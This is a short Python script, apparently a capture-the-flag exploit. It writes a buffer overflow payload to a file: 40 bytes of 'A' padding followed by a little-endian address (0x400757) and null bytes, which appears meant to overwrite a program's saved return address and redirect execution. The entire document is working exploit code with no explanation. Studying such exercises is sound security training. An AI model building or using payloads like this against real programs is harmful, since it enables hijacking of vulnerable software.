payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + b'\x57\x07\x40'+ bytes(5)

file = open('payload','wb')

file.write(payload)